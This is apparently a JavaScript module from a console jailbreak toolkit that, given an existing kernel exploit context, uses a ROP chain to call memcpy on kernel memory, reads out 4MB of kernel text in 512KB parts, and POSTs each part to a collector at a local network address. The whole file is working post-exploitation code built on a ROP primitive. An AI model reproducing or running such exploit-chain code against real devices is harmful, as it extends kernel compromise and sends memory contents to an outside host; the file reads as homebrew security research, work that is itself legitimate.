// Read-only kernel dump: one ROP memcpy per 512KB part (sustained pipe
// transactions panicked the kernel), parts POSTed to the Mac collector as
// independent files so a crash keeps whatever landed.

const BATCH = 0x80000; // 512KB per memcpy call
const PARTS = 8;       // 4MB total kernel text
const LC_MEMCPY = 0x3e00; // window.SYMBOLS.libc.memcpy, libSceLibcInternal

function collectorBase() {
  return typeof location !== "undefined" &&
    location.origin.startsWith("http://192.168.10.210")
    ? ""
    : "http://192.168.10.210:8079";
}

async function postPart(name, bytes) {
  // Blob body: old WebKit rejects typed-array fetch bodies before sending
  await fetch(collectorBase() + "/dump/" + name, {
    method: "POST",
    headers: { "Content-Type": "text/plain" },
    body: new Blob([bytes], { type: "text/plain" }),
  });
}

export async function dumpKernel(result, log) {
  const kern = result && result.kern;
  if (!kern || !result.kbase || !kern.chain) {
    log("probe: no kernel context, skipping");
    return;
  }

  const p = kern.p;
  const memcpy = p.libSceLibcInternalBase.add32(LC_MEMCPY);
  const dst = p.malloc(BATCH, 1);
  const out = new Uint8Array(BATCH);
  const stem = "ktext_1360_0x" + result.kbase.toString(16);

  for (let i = 0; i < PARTS; i++) {
    try {
      await kern.chain.call(
        memcpy,
        dst,
        result.kbase.add32(i * BATCH),
        new int64(BATCH, 0)
      );
      for (let j = 0; j < BATCH; j += 4) {
        const v = p.read4(dst.add32(j));
        out[j] = v & 0xff;
        out[j + 1] = (v >>> 8) & 0xff;
        out[j + 2] = (v >>> 16) & 0xff;
        out[j + 3] = (v >>> 24) & 0xff;
      }
      await postPart(stem + "_part" + i + ".bin", out);
      log("probe: part " + (i + 1) + "/" + PARTS + " sent", "info");
    } catch (e) {
      log("probe: stopped at part " + i + " (" + e + ")");
      return;
    }
  }

  log("probe: dump complete, " + PARTS + " parts on collector", "info");
}
